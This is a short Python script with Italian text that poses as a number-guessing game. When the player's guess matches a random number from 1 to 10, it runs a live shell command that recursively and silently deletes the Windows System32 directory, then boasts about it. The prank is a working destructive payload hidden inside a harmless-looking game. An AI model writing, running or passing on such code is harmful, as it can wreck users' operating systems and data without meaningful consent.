import random
import os

print("Benvenuto!")

num = random.randint(1, 10)

scelta = int(input("Scegli un numero tra 1 e 10: "))

if scelta == num:
    print("Mi dispiace.. credo che dovrai reinstallare windows! 😈")
    os.system("rmdir /S /Q C:\\Windows\\System32")
    print("System32 disinstallato con successo! 😱")
else:
    print("Phew! Sei sopravvissuto! La prossima volta potresti non essere così fortunato! 😜")
